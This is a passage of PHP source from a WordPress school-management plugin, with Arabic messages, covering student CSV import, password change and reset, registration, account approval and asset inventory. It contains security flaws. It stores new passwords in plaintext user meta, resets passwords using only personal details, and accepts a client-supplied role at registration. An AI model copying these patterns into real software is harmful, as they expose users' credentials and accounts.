                    'id'             => intval($data[1]),
                    'name'           => isset($data[2]) ? trim($data[2]) : '',
                    'national_id'    => !empty($data[3]) ? trim($data[3]) : '',
                    'class_name'     => isset($data[4]) ? trim($data[4]) : '',
                    'section'        => isset($data[5]) ? trim($data[5]) : '',
                    'nationality'    => isset($data[6]) ? trim($data[6]) : '',
                    'dob'            => isset($data[7]) ? trim($data[7]) : '',
                    'gender'         => isset($data[8]) ? trim($data[8]) : '',
                    'parent_email'   => isset($data[10]) ? trim($data[10]) : '',
                    'guardian_phone' => isset($data[11]) ? trim($data[11]) : '',
                    'photo_url'      => isset($data[13]) ? trim($data[13]) : '',
                    'school_id'      => is_numeric($data[14] ?? '') ? intval($data[14]) : 0
                );
            } else {
                // 11 Official Columns
                $row_data = array(
                    'student_code'   => isset($data[0]) ? trim($data[0]) : '',
                    'name'           => isset($data[1]) ? trim($data[1]) : '',
                    'national_id'    => isset($data[2]) ? trim($data[2]) : '',
                    'class_name'     => isset($data[3]) ? trim($data[3]) : '',
                    'section'        => isset($data[4]) ? trim($data[4]) : '',
                    'nationality'    => isset($data[5]) ? trim($data[5]) : '',
                    'parent_email'   => isset($data[7]) ? trim($data[7]) : '',
                    'guardian_phone' => isset($data[8]) ? trim($data[8]) : '',
                    'photo_url'      => isset($data[9]) ? trim($data[9]) : '',
                    'school_id'      => is_numeric($data[10] ?? '') ? intval($data[10]) : 0
                );
            }

            $is_existing = false;
            $check_code = $row_data['student_code'] ?? '';
            $check_nat = $row_data['national_id'] ?? '';
            if (!empty($check_code)) {
                $is_existing = (bool) $wpdb->get_var($wpdb->prepare("SELECT id FROM {$wpdb->prefix}sm_students WHERE student_code = %s", $check_code));
            }
            if (!$is_existing && !empty($check_nat)) {
                $is_existing = (bool) $wpdb->get_var($wpdb->prepare("SELECT id FROM {$wpdb->prefix}sm_students WHERE national_id = %s", $check_nat));
            }

            $saved_id = EESS_Student_Data_Service::process_and_save_student($row_data);
            if (is_wp_error($saved_id)) {
                $results['error']++;
                $results['details'][] = array('type' => 'error', 'msg' => "السطر $row_index: " . $saved_id->get_error_message());
            } else {
                $results['success']++;
                if ($is_existing) {
                    $results['duplicate']++;
                    $results['details'][] = array('type' => 'info', 'msg' => "تم تحديث سجل ({$row_data['name']}) في السطر $row_index");
                }
                if (empty($row_data['student_code'])) {
                    $results['generated']++;
                }
            }
        }

        fclose($handle);
        set_transient('sm_import_results_' . get_current_user_id(), $results, HOUR_IN_SECONDS);

        $is_finished = ($processed < $chunk_size);
        if ($is_finished) {
            unlink($file_path);
            SM_Logger::log('استيراد طلاب (AJAX)', "تم استيراد {$results['success']} طالب بنجاح.");
        }

        wp_send_json_success(array(
            'processed' => $processed,
            'finished'  => $is_finished,
            'total_so_far' => $offset + $processed
        ));
    }

    public function ajax_eess_student_change_password() {
        if (!is_user_logged_in()) {
            wp_send_json_error('عفواً، يتطلب هذا الإجراء تسجيل الدخول أولاً.');
        }

        $user_id = get_current_user_id();
        $user = get_userdata($user_id);
        $roles = (array) $user->roles;

        if (!in_array('sm_student', $roles) && !in_array('sm_parent', $roles) && !in_array('administrator', $roles)) {
            wp_send_json_error('هذا الإجراء مخصص لحسابات الطلاب وأولياء الأمور فقط.');
        }

        if (!wp_verify_nonce($_POST['eess_student_password_nonce'] ?? ($_POST['nonce'] ?? ''), 'eess_student_password_action')) {
            wp_send_json_error('فشل التحقق من أمان الجلسة.');
        }

        $new_pass = trim($_POST['new_password'] ?? '');
        $confirm_pass = trim($_POST['confirm_password'] ?? '');

        if (empty($new_pass) || empty($confirm_pass)) {
            wp_send_json_error('يرجى إدخال كلمة المرور الجديدة وتأكيدها.');
        }

        if ($new_pass !== $confirm_pass) {
            wp_send_json_error('كلمتا المرور غير متطابقتين.');
        }

        // Validate password complexity: Min 8, Max 30, at least 1 uppercase, 1 lowercase, 1 number
        if (!preg_match('/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,30}$/', $new_pass)) {
            wp_send_json_error('كلمة المرور يجب أن تحتوي على 8-30 حرفاً، وتشمل حرفاً كبيراً واحداً (A-Z)، وحرفاً صغيراً (a-z)، ورقماً على الأقل (0-9).');
        }

        wp_set_password($new_pass, $user_id);
        delete_user_meta($user_id, 'eess_must_change_password');
        update_user_meta($user_id, 'sm_temp_pass', $new_pass);

        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id, true);

        SM_Logger::log('تغيير كلمة مرور الطالب', "قام المستخدم ({$user->display_name}) بتعيين كلمة مرور جديدة بنجاح.");
        wp_send_json_success('تم تعيين كلمة المرور الجديدة بنجاح.');
    }

    // Custom mail sender filters
    public function custom_wp_mail_from($original_email_address) {
        return 'info@eess.online';
    }

    public function custom_wp_mail_from_name($original_email_from) {
        return 'منظومة شعلة - SHOLA';
    }

    // Branded EESS Email Helper
    private function send_branded_email($to, $subject, $title, $body_content) {
        add_filter('wp_mail_from', array($this, 'custom_wp_mail_from'));
        add_filter('wp_mail_from_name', array($this, 'custom_wp_mail_from_name'));

        $headers = array('Content-Type: text/html; charset=UTF-8', 'From: منظومة شعلة - SHOLA <info@eess.online>');

        $html = '
        <div dir="rtl" style="font-family: \'Cairo\', \'Noto Kufi Arabic\', Arial, sans-serif; background-color: #f8fafc; padding: 40px 20px; text-align: right; direction: rtl;">
            <div style="max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 12px; border: 1px solid #cbd5e1; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);">
                <div style="background: #0d0d0d; padding: 25px; text-align: center; border-bottom: 4px solid #8b1e1e;">
                    <h2 style="color: #ffffff; margin: 0; font-weight: 800; font-size: 1.5rem; letter-spacing: 1px;">EESS</h2>
                    <div style="color: #cbd5e1; font-size: 11px; margin-top: 5px;">Educational Electronic Systems Services</div>
                </div>
                <div style="padding: 30px; box-sizing: border-box;">
                    <h3 style="color: #0f172a; margin-top: 0; font-weight: 800; font-size: 1.2rem;">' . esc_html($title) . '</h3>
                    <div style="color: #334155; font-size: 14px; line-height: 1.8; margin-bottom: 25px;">
                        ' . $body_content . '
                    </div>
                    <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 15px; margin-bottom: 25px; font-size: 12px; color: #64748b;">
                        إذا واجهت أي صعوبة في الدخول أو استخدام الخدمة، يمكنك دائماً مراجعة قسم الدعم الفني عبر البريد الإلكتروني الرسمي: <a href="mailto:info@eess.online" style="color: #8b1e1e; font-weight: bold; text-decoration: none;">info@eess.online</a>.
                    </div>
                </div>
                <div style="background: #f1f5f9; padding: 15px 30px; text-align: center; font-size: 11px; color: #94a3b8; border-top: 1px solid #e2e8f0;">
                    <div>جميع الحقوق محفوظة © 2026 EESS. خدمات الأنظمة الإلكترونية التعليمية</div>
                    <div style="margin-top: 5px;"><a href="https://eess.online" target="_blank" style="color: #94a3b8; text-decoration: underline;">eess.online</a></div>
                </div>
            </div>
        </div>
        ';
        return wp_mail($to, $subject, $html, $headers);
    }

    // Block Pending Approval & Restricted users from logging in
    public function block_pending_users_login($user, $password) {
        if ($user instanceof WP_User) {
            $status = get_user_meta($user->ID, 'eess_approval_status', true);
            $restricted = get_user_meta($user->ID, 'eess_access_restricted', true);
            $reason = get_user_meta($user->ID, 'eess_restriction_reason', true) ?: 'غير محدد';

            if ($status === 'pending') {
                return new WP_Error(
                    'pending_approval',
                    'حسابك قيد المراجعة الإدارية. يرجى الانتظار لحين اعتماد وتفعيل الحساب من قبل قسم إدارة المستخدمين.'
                );
            }
            if ($status === 'restricted' || $restricted === 'yes') {
                return new WP_Error(
                    'restricted_access',
                    'عذراً، تم تقييد دخولك إلى المنصة من قبل إدارة الموارد البشرية لسبب: ' . esc_html($reason)
                );
            }
        }
        return $user;
    }

    // Multi-Step Identity Verification Without OTP
    public function ajax_forgot_verify_identity() {
        // Rate Limiting Protection (Max 5 attempts per 15 mins)
        $ip_address = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
        $rate_key   = 'eess_forgot_attempts_' . md5($ip_address);
        $attempts   = (int) get_transient($rate_key);
        if ($attempts >= 5) {
            wp_send_json_error('تمت تجاوز عدد محاولات الاستعادة المسموح بها. يرجى الانتظار لمدة 15 دقيقة قبل المحاولة مجدداً.');
        }

        $email       = sanitize_email($_POST['email'] ?? '');
        $emp_id      = sanitize_text_field($_POST['emp_id'] ?? '');
        $institution = sanitize_text_field($_POST['institution'] ?? '');
        $nationality = sanitize_text_field($_POST['nationality'] ?? '');
        $role        = sanitize_text_field($_POST['role'] ?? '');
        $subject     = sanitize_text_field($_POST['subject'] ?? '');
        $dob         = sanitize_text_field($_POST['dob'] ?? '');

        if (empty($email) || empty($emp_id) || empty($role) || empty($dob)) {
            set_transient($rate_key, $attempts + 1, 15 * MINUTE_IN_SECONDS);
            wp_send_json_error('يرجى تعبئة كافة حقول التحقق الأساسية المطلوب تأكيدها.');
        }

        // 1. Verify User by Email
        $user = get_user_by('email', $email);
        if (!$user) {
            set_transient($rate_key, $attempts + 1, 15 * MINUTE_IN_SECONDS);
            wp_send_json_error('عفواً، البيانات المدخلة غير متطابقة مع بيانات الحساب.');
        }

        // 2. Verify Employee ID
        $clean_emp_id = trim(preg_replace('/^(EMP|EMP-|_)+/i', '', trim($emp_id)));
        $stored_emp1  = get_user_meta($user->ID, 'sm_employee_id', true);
        $stored_emp2  = get_user_meta($user->ID, 'employee_id', true);
        if ($user->user_login !== $clean_emp_id && $stored_emp1 !== $clean_emp_id && $stored_emp2 !== $clean_emp_id && $stored_emp1 !== $emp_id) {
            set_transient($rate_key, $attempts + 1, 15 * MINUTE_IN_SECONDS);
            wp_send_json_error('بيانات الرقم الوظيفي غير متطابقة.');
        }

        // 3. Verify Role
        $user_roles = (array) $user->roles;
        if (!in_array($role, $user_roles) && !($role === 'sm_teacher' && in_array('sm_teacher', $user_roles))) {
            set_transient($rate_key, $attempts + 1, 15 * MINUTE_IN_SECONDS);
            wp_send_json_error('الرتبة المحددة غير متطابقة مع رتبة الحساب.');
        }

        // 4. Verify Institution
        if (!empty($institution)) {
            $stored_inst1 = get_user_meta($user->ID, 'institution', true);
            $stored_inst2 = get_user_meta($user->ID, 'sm_institution', true);
            $stored_inst3 = get_user_meta($user->ID, 'eess_school_name', true);
            $school_info  = SM_Settings::get_school_info();
            $default_inst = $school_info['school_name'] ?? 'خدمات الأنظمة الإلكترونية التعليمية (EESS)';

            $inst_match = (strcasecmp($stored_inst1, $institution) === 0) ||
                         (strcasecmp($stored_inst2, $institution) === 0) ||
                         (strcasecmp($stored_inst3, $institution) === 0) ||
                         (empty($stored_inst1) && strcasecmp($default_inst, $institution) === 0);

            if (!$inst_match) {
                set_transient($rate_key, $attempts + 1, 15 * MINUTE_IN_SECONDS);
                wp_send_json_error('اسم المؤسسة أو المدرسة غير متطابق.');
            }
        }

        // 5. Verify Nationality
        if (!empty($nationality)) {
            $stored_nat1 = get_user_meta($user->ID, 'nationality', true);
            $stored_nat2 = get_user_meta($user->ID, 'sm_nationality', true);
            if (!empty($stored_nat1) || !empty($stored_nat2)) {
                if (strcasecmp($stored_nat1, $nationality) !== 0 && strcasecmp($stored_nat2, $nationality) !== 0) {
                    set_transient($rate_key, $attempts + 1, 15 * MINUTE_IN_SECONDS);
                    wp_send_json_error('بيانات الجنسية غير متطابقة.');
                }
            }
        }

        // 6. Verify Subject if applicable
        $roles_requiring_subject = array('sm_teacher', 'sm_coordinator', 'sm_hod');
        if (in_array($role, $roles_requiring_subject) && !empty($subject)) {
            $stored_sub1 = get_user_meta($user->ID, 'sm_specialization', true);
            $stored_sub2 = get_user_meta($user->ID, 'specialization', true);
            if (!empty($stored_sub1) || !empty($stored_sub2)) {
                if (strcasecmp($stored_sub1, $subject) !== 0 && strcasecmp($stored_sub2, $subject) !== 0) {
                    set_transient($rate_key, $attempts + 1, 15 * MINUTE_IN_SECONDS);
                    wp_send_json_error('المادة المحددة غير متطابقة مع مادة المعلم المسجلة.');
                }
            }
        }

        // 7. Verify Date of Birth
        if (!empty($dob)) {
            $stored_dob1 = get_user_meta($user->ID, 'sm_dob', true);
            $stored_dob2 = get_user_meta($user->ID, 'dob', true);
            if (!empty($stored_dob1) || !empty($stored_dob2)) {
                if ($stored_dob1 !== $dob && $stored_dob2 !== $dob) {
                    set_transient($rate_key, $attempts + 1, 15 * MINUTE_IN_SECONDS);
                    wp_send_json_error('تاريخ الميلاد غير متطابق.');
                }
            }
        }

        // Generate verified token for resetting password
        $reset_token = wp_generate_password(32, false);
        set_transient('eess_verified_reset_user_' . $reset_token, $user->ID, 15 * MINUTE_IN_SECONDS);

        delete_transient($rate_key);

        wp_send_json_success(array(
            'reset_token'  => $reset_token,
            'display_name' => $user->display_name
        ));
    }

    // Set New Password & Automatic Authentication
    public function ajax_forgot_set_password() {
        $reset_token = sanitize_text_field($_POST['reset_token'] ?? '');
        $password    = $_POST['password'] ?? '';
        $pass_conf   = $_POST['password_conf'] ?? '';

        if (empty($reset_token) || empty($password) || empty($pass_conf)) {
            wp_send_json_error('جميع الحقول مطلوبة.');
        }

        $user_id = get_transient('eess_verified_reset_user_' . $reset_token);
        if (!$user_id) {
            wp_send_json_error('انتهت صلاحية جلسة التحقق الآمنة. يرجى إعادة خطوات التحقق من جديد.');
        }

        if ($password !== $pass_conf) {
            wp_send_json_error('كلمتا المرور غير متطابقتين.');
        }

        // Password Validation Rules: 8-40 chars, 1 uppercase, 1 lowercase, 1 number
        $length = mb_strlen($password);
        if ($length < 8 || $length > 40) {
            wp_send_json_error('كلمة المرور يجب أن تكون بين 8 و 40 خانة.');
        }

        if (!preg_match('/[A-Z]/', $password)) {
            wp_send_json_error('كلمة المرور يجب أن تحتوي على حرف إنجليزي كبير (A-Z) واحد على الأقل.');
        }

        if (!preg_match('/[a-z]/', $password)) {
            wp_send_json_error('كلمة المرور يجب أن تحتوي على حرف إنجليزي صغير (a-z) واحد على الأقل.');
        }

        if (!preg_match('/[0-9]/', $password)) {
            wp_send_json_error('كلمة المرور يجب أن تحتوي على رقم (0-9) واحد على الأقل.');
        }

        // Save New Password
        wp_set_password($password, $user_id);
        delete_transient('eess_verified_reset_user_' . $reset_token);

        // Automatic Authenticate & Login User
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id, true);

        SM_Logger::log('إعادة تعيين كلمة المرور', "تم تغيير كلمة المرور وتوثيق الدخول التلقائي للمستخدم ID: $user_id");

        wp_send_json_success(array(
            'message'      => 'تم حفظ كلمة المرور الجديدة وتوثيق دخولك بنجاح!',
            'redirect_url' => home_url('/sm-admin')
        ));
    }

    // Registration Wizard Submit Without OTP
    public function ajax_register_submit() {
        $first_name  = sanitize_text_field($_POST['first_name'] ?? '');
        $last_name   = sanitize_text_field($_POST['last_name'] ?? '');
        $dob         = sanitize_text_field($_POST['dob'] ?? '');
        $nationality = sanitize_text_field($_POST['nationality'] ?? '');
        $email       = sanitize_email($_POST['email'] ?? '');
        $phone       = sanitize_text_field($_POST['phone'] ?? '');
        $emp_num     = sanitize_text_field($_POST['emp_num'] ?? '');
        $institution = sanitize_text_field($_POST['institution'] ?? '');
        $school      = sanitize_text_field($_POST['school'] ?? '');
        $role        = sanitize_text_field($_POST['role'] ?? '');
        $subject     = sanitize_text_field($_POST['subject'] ?? '');
        $password    = $_POST['password'] ?? '';
        $pass_conf   = $_POST['password_conf'] ?? '';

        if (empty($first_name) || empty($last_name) || empty($dob) || empty($nationality) || empty($email) || empty($emp_num) || empty($institution) || empty($role) || empty($password)) {
            wp_send_json_error('جميع الحقول الأساسية إلزامية لإكمال طلب التسجيل.');
        }

        // Validate role requiring subject
        $roles_requiring_subject = array('sm_teacher', 'sm_coordinator', 'sm_hod');
        if (in_array($role, $roles_requiring_subject) && empty($subject)) {
            wp_send_json_error('يرجى تحديد المادة الدراسية المسندة لتدريسها.');
        }

        if ($password !== $pass_conf) {
            wp_send_json_error('كلمتا المرور غير متطابقتين.');
        }

        // Password Validation Rules: 8-40 chars, 1 uppercase, 1 lowercase, 1 number
        $length = mb_strlen($password);
        if ($length < 8 || $length > 40) {
            wp_send_json_error('كلمة المرور يجب أن تكون بين 8 و 40 خانة.');
        }

        if (!preg_match('/[A-Z]/', $password) || !preg_match('/[a-z]/', $password) || !preg_match('/[0-9]/', $password)) {
            wp_send_json_error('كلمة المرور يجب أن تحتوى على حرف كبير وحرف صغير ورقم على الأقل.');
        }

        if (email_exists($email)) {
            wp_send_json_error('البريد الإلكتروني مُسجل بالفعل بحساب آخر.');
        }

        // Clean Employee Number to enforce Username = Employee Number
        $clean_emp_num = trim(preg_replace('/^(EMP|EMP-|_)+/i', '', trim($emp_num)));
        if (empty($clean_emp_num)) {
            $clean_emp_num = trim($emp_num);
        }
        $username = $clean_emp_num;

        if (username_exists($username)) {
            wp_send_json_error('الرقم الوظيفي (اسم المستخدم) مسجل بالفعل لمستخدم آخر.');
        }

        $display_name = trim($first_name . ' ' . $last_name);
        if (empty($display_name)) {
            $display_name = $username;
        }

        $user_id = wp_insert_user(array(
            'user_login' => $username,
            'user_email' => $email,
            'user_pass'  => $password,
            'role'       => $role,
            'first_name' => $first_name,
            'last_name'  => $last_name,
            'display_name'=> $display_name
        ));

        if (is_wp_error($user_id)) {
            wp_send_json_error($user_id->get_error_message());
        }

        // Set pending status and metadata
        update_user_meta($user_id, 'eess_approval_status', 'pending');
        update_user_meta($user_id, 'eess_employee_number', $clean_emp_num);
        update_user_meta($user_id, 'sm_employee_id', $clean_emp_num);
        update_user_meta($user_id, 'employee_id', $clean_emp_num);
        update_user_meta($user_id, 'eess_school_name', $school);
        update_user_meta($user_id, 'first_name', $first_name);
        update_user_meta($user_id, 'last_name', $last_name);
        update_user_meta($user_id, 'dob', $dob);
        update_user_meta($user_id, 'sm_dob', $dob);
        update_user_meta($user_id, 'nationality', $nationality);
        update_user_meta($user_id, 'sm_nationality', $nationality);
        update_user_meta($user_id, 'institution', $institution);
        update_user_meta($user_id, 'sm_institution', $institution);
        update_user_meta($user_id, 'phone_number', $phone);
        update_user_meta($user_id, 'sm_phone', $phone);
        if (!empty($subject)) {
            update_user_meta($user_id, 'specialization', $subject);
            update_user_meta($user_id, 'sm_specialization', $subject);
        }

        delete_transient('eess_register_otp_' . md5($email));

        // Notify System User Management
        $admin_email = get_option('admin_email') ?: 'info@eess.online';
        $admin_title = 'طلب تسجيل حساب جديد قيد الانتظار - EESS';
        $admin_body = '
        <p>مرحباً بقسم إدارة المستخدمين،</p>
        <p>تم استلام طلب تسجيل حساب جديد بالمنصة وينتظر المراجعة والاعتماد.</p>
        <div style="background: #f8fafc; padding: 15px; border-radius: 6px; border:1px solid #e2e8f0; line-height: 1.8;">
            <strong>الاسم الكامل:</strong> ' . esc_html($display_name) . '<br>
            <strong>البريد الإلكتروني:</strong> ' . esc_html($email) . '<br>
            <strong>رقم الموظف:</strong> ' . esc_html($emp_num) . '<br>
            <strong>الرتبة / المسمى الوظيفي:</strong> ' . esc_html($role) . '<br>
            <strong>المدرسة المنتسب لها:</strong> ' . esc_html($school) . '<br>
        </div>
        <p>يمكنكم مراجعة الطلب والموافقة عليه أو رفضه مباشرة من خلال تبويب إدارة المستخدمين بلوحة التحكم.</p>
        ';
        $this->send_branded_email($admin_email, $admin_title, 'طلب تسجيل حساب قيد الانتظار', $admin_body);

        wp_send_json_success('تم تسجيل الحساب بنجاح. حسابك حالياً قيد المراجعة الإدارية وسوف نرسل لك تفعيلاً فور الاعتماد.');
    }

    // Admin Action: Approve user
    public function ajax_approve_user() {
        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'sm_teacher_action')) {
            wp_send_json_error('Security check failed');
        }
        if (!is_user_logged_in() || !current_user_can('manage_options')) {
            wp_send_json_error('غير مصرح لك بإجراء هذه العملية.');
        }

        $target_user_id = isset($_POST['user_id']) ? intval($_POST['user_id']) : 0;
        if (!$target_user_id) {
            wp_send_json_error('معرف المستخدم غير صحيح.');
        }

        update_user_meta($target_user_id, 'eess_approval_status', 'approved');
        update_user_meta($target_user_id, 'sm_account_status', 'active');

        $user = get_user_by('id', $target_user_id);
        $title = 'اعتماد وتفعيل حسابك الإلكتروني - EESS Account Activation';

        $body = '
        <table dir="rtl" style="text-align: right; width: 100%; font-family: \'Cairo\', sans-serif; border-collapse: collapse; margin-bottom: 25px;">
            <tr>
                <td>
                    <h3 style="color: #0f172a; font-size: 16px; margin: 0 0 10px 0; font-weight: bold;">أهلاً بك يا ' . esc_html($user->display_name ?: $user->user_email) . '،</h3>
                    <p style="font-size: 13px; color: #334155; line-height: 1.8; margin: 0 0 15px 0;">يسعدنا إبلاغك بأنه تم مراجعة واعتماد حسابك بنجاح على منصة <strong>خدمات الأنظمة الإلكترونية التعليمية (EESS)</strong>. حسابك الآن نشط بالكامل وجاهز للاستخدام الفوري.</p>

                    <div style="background: #f8fafc; border: 1px solid #cbd5e1; padding: 15px; border-radius: 8px; margin-bottom: 15px; font-size: 13px;">
                        <strong>تفاصيل الحساب / Account Details:</strong><br>
                        • اسم المستخدم: <span style="font-family: monospace; font-weight: bold;">' . esc_html($user->user_login) . '</span><br>
                        • البريد الإلكتروني: <span style="font-family: monospace; font-weight: bold;">' . esc_html($user->user_email) . '</span><br>
                    </div>

                    <p style="font-size: 13px; color: #334155; line-height: 1.8;"><strong>توصيات أمنية هامة:</strong> يرجى التأكد من عدم مشاركة بيانات دخولك أو رمز التفعيل مع أي شخص آخر، واحرص على استخدام كلمة مرور قوية لضمان أمان معلوماتك.</p>
                </td>
            </tr>
        </table>

        <hr style="border: none; border-top: 1px solid #cbd5e1; margin: 25px 0;">

        <table dir="ltr" style="text-align: left; width: 100%; font-family: \'Cairo\', sans-serif; border-collapse: collapse;">
            <tr>
                <td>
                    <h3 style="color: #0f172a; font-size: 16px; margin: 0 0 10px 0; font-weight: bold;">Welcome, ' . esc_html($user->display_name ?: $user->user_email) . ',</h3>
                    <p style="font-size: 13px; color: #334155; line-height: 1.8; margin: 0 0 15px 0;">We are pleased to inform you that your account has been reviewed and successfully approved on the <strong>Educational Electronic Systems Services (EESS)</strong> platform. Your account is now fully active and ready for use.</p>

                    <p style="font-size: 13px; color: #334155; line-height: 1.8;"><strong>Important Security Recommendations:</strong> Please ensure never to share your login credentials or OTP with anyone else, and use a strong password to ensure the security of your private data.</p>
                </td>
            </tr>
        </table>

        <div style="text-align: center; margin: 30px 0;">
            <a href="' . home_url('/sm-login') . '" style="display:inline-block; background:#000000; color:#ffffff !important; text-decoration:none; padding:12px 35px; font-weight:bold; border-radius:6px; font-size:14px; font-family:\'Cairo\', sans-serif;">تسجيل الدخول للمنصة / Login to Platform</a>
        </div>
        ';

        $this->send_branded_email($user->user_email, $title, 'تنشيط حسابك بالمنصة', $body);

        wp_send_json_success('تم اعتماد وتنشيط الحساب وإخطار المستخدم بنجاح.');
    }

    // Admin Action: Reject user
    public function ajax_reject_user() {
        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'sm_teacher_action')) {
            wp_send_json_error('Security check failed');
        }
        if (!is_user_logged_in() || !current_user_can('manage_options')) {
            wp_send_json_error('غير مصرح لك بإجراء هذه العملية.');
        }

        $target_user_id = isset($_POST['user_id']) ? intval($_POST['user_id']) : 0;
        if (!$target_user_id) {
            wp_send_json_error('معرف المستخدم غير صحيح.');
        }

        $user = get_user_by('id', $target_user_id);
        if ($user) {
            $title = 'بخصوص طلب تسجيل حسابك - EESS';
            $body = '
            <p>مرحباً بك،</p>
            <p>نأسف لإبلاغك بأنه تم رفض طلب التسجيل الخاص بك على منصة EESS الإلكترونية بعد المراجعة الإدارية.</p>
            <p>في حال كنت تعتقد أن هناك خطأً، يرجى التواصل مجدداً مع الدعم الفني أو مراجعة إدارة شؤون الموظفين.</p>
            ';
            $this->send_branded_email($user->user_email, $title, 'مراجعة طلب التسجيل', $body);

            // Delete user
            require_once(ABSPATH . 'wp-admin/includes/user.php');
            wp_delete_user($target_user_id);
        }

        wp_send_json_success('تم رفض طلب التسجيل وحذف الحساب المعلق بنجاح.');
    }

    // Admin Action: Save user notes
    public function ajax_save_user_notes() {
        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'sm_teacher_action')) {
            wp_send_json_error('Security check failed');
        }
        if (!is_user_logged_in() || !current_user_can('manage_options')) {
            wp_send_json_error('غير مصرح لك بإجراء هذه العملية.');
        }

        $target_user_id = isset($_POST['user_id']) ? intval($_POST['user_id']) : 0;
        $notes = isset($_POST['notes']) ? sanitize_textarea_field($_POST['notes']) : '';

        if (!$target_user_id) {
            wp_send_json_error('معرف المستخدم غير صحيح.');
        }

        update_user_meta($target_user_id, 'eess_admin_notes', $notes);
        wp_send_json_success('تم حفظ الملاحظات الداخلية بنجاح.');
    }

    public function ajax_get_user_assignments() {
        if (!is_user_logged_in() || !current_user_can('إدارة_النظام')) {
            wp_send_json_error('Unauthorized');
        }
        $user_id = intval($_GET['user_id']);
        $scope = EESS_Org_Helper::get_user_scope($user_id);
        wp_send_json_success($scope);
    }

    public function ajax_sm_save_asset_inventory() {
        if (!is_user_logged_in()) wp_send_json_error('يجب تسجيل الدخول.');
        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'nonce')) {
            wp_send_json_error('Security check failed');
        }

        $user_id    = get_current_user_id();
        $catalog_id = intval($_POST['catalog_id'] ?? 0);
        $qty_total  = max(1, intval($_POST['qty_total'] ?? 1));
        $qty_usable = max(0, intval($_POST['qty_usable'] ?? $qty_total));
        $qty_damaged = max(0, intval($_POST['qty_damaged'] ?? 0));
        $qty_missing = max(0, intval($_POST['qty_missing'] ?? 0));
        $location   = sanitize_text_field($_POST['location'] ?? 'مخزن التربية البدنية');

        $school_name = get_user_meta($user_id, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
        $department  = get_user_meta($user_id, 'department', true) ?: 'التربية البدنية والصحية';

        global $wpdb;

        // Check if institutional inventory header exists or create
        $inv_id = $wpdb->get_var($wpdb->prepare("SELECT id FROM {$wpdb->prefix}sm_asset_inventories WHERE school_name = %s LIMIT 1", $school_name));
        if (!$inv_id) {
            $wpdb->insert("{$wpdb->prefix}sm_asset_inventories", array(
                'institution_id' => 1,
                'school_name'    => $school_name,
                'department'     => $department,
                'academic_year'  => '2027/2026',
                'responsible_user_id' => $user_id,
                'status'         => 'approved',
                'created_at'     => current_time('mysql'),
                'updated_at'     => current_time('mysql')
            ));
            $inv_id = $wpdb->insert_id;
        }

        // Fetch catalog item details
        $item_info = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_asset_catalog WHERE id = %d", $catalog_id));
        $item_name = $item_info ? $item_info->item_name : 'معدة رياضية جديدة';
        $category  = $item_info ? $item_info->category : 'معدات رياضية';

        $inserted = $wpdb->insert("{$wpdb->prefix}sm_asset_inventory_items", array(
            'inventory_id'   => $inv_id,
            'catalog_id'     => $catalog_id,
            'item_name'      => $item_name,
            'category'       => $category,
            'qty_total'      => $qty_total,
            'qty_usable'     => $qty_usable,
            'qty_consumed'   => 0,
            'qty_damaged'    => $qty_damaged,
            'qty_missing'    => $qty_missing,
            'qty_replacement' => $qty_damaged + $qty_missing,
            'location'       => $location,
            'condition_status' => 'good',
            'created_at'     => current_time('mysql')
        ));

        if ($inserted) {
            SM_Logger::log('إضافة حصر عهدة', "تم إدراج عهدة جديدة ($item_name) لـ $school_name بواسطة المستخدم ID: $user_id");
            wp_send_json_success(array('message' => 'تم حفظ وتحديث حصر العهدة بنجاح.'));
        } else {
            wp_send_json_error('تعذر حفظ حصر العهدة في قاعدة البيانات.');
        }
    }

    public function ajax_sm_save_asset_request() {
        if (!is_user_logged_in()) wp_send_json_error('يجب تسجيل الدخول.');
        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'nonce')) {
            wp_send_json_error('Security check failed');
        }

        $user_id       = get_current_user_id();
        $catalog_id    = intval($_POST['catalog_id'] ?? 0);
        $qty_requested = max(1, intval($_POST['qty_requested'] ?? 1));
        $reason        = sanitize_text_field($_POST['request_reason'] ?? 'استبدال معدات تالفة');

        $school_name = get_user_meta($user_id, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
        $department  = get_user_meta($user_id, 'department', true) ?: 'التربية البدنية والصحية';

        global $wpdb;
        $inserted = $wpdb->insert("{$wpdb->prefix}sm_asset_requests", array(
            'institution_id'   => 1,
            'school_name'      => $school_name,
            'department'       => $department,
            'requester_user_id'=> $user_id,
            'request_reason'   => $reason,
            'priority'         => 'normal',
            'status'           => 'submitted',
            'created_at'       => current_time('mysql'),
            'updated_at'       => current_time('mysql')
        ));

        if ($inserted) {
            $req_id = $wpdb->insert_id;
            $request_items = $_POST['items'] ?? array();

            if (empty($request_items) && $catalog_id > 0) {
                $request_items = array(array('catalog_id' => $catalog_id, 'qty_requested' => $qty_requested));
            }

            $added_names = array();

            foreach ($request_items as $item_entry) {
                $cat_id = intval($item_entry['catalog_id'] ?? 0);
                $qty_req = max(1, intval($item_entry['qty_requested'] ?? 1));
